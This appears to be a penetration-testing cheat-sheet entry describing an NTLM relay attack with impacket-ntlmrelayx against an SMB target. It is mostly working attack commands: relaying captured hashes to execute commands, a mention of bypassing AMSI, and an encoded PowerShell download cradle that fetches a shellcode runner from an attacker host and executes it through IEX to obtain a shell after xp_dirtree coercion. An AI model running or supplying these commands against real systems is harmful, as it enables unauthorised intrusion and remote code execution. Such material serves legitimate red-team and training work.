Use ntlmrelay to capture or relay a hash.

> Setup server:

```
sudo impacket-ntlmrelayx -smb2support -t smb://<target_ip> -c 'whoami'
```

> Run XP dirtree or another authentication attack and view the output. If there is command execution then we can bypass amsi and try to get a shell. First we encode our download cradle:

```
python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://192.168.x.x/run.txt\\') | IEX'.encode('utf-16le')).decode())"
```

> Once we have our encoded download cradle we can start our server for ntlmrelay and our python server on kali:

```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t smb://<target_ip> -c 'powershell -enc <encoded_string>'
```

Now we launch XP dirtree and it will download our run.txt shellcode runner and we can get a shell.